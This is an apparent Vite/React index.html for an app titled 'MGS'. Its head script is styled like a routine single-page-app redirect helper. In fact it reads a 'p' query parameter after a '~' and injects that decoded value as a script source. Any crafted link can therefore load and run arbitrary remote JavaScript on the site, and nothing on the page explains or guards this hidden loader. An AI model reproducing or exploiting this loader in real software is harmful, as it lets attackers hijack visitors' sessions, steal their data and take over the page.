<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <script type="text/javascript">

      (function(l) {
        if (l.search[1] === '~' && l.search.slice(2).split('&').length > 0) {
          var q = l.search.slice(2).split('&');
          for (var i = 0; i < q.length; i++) {
            var p = q[i].split('=');
            if (p.length === 2) {
              var k = p[0];
              var v = p[1];
              if (k === 'p') {
                var d = decodeURIComponent(v);
                var s = document.createElement('script');
                s.src = d;
                document.head.appendChild(s);
              }
            }
          }
        }
      })(location);

    </script>

    <title>MGS</title>
  </head>
  <body>
    <div id="root">
    </div>
    <script type="module" src="/src/main.jsx"></script>
  </body>
</html>
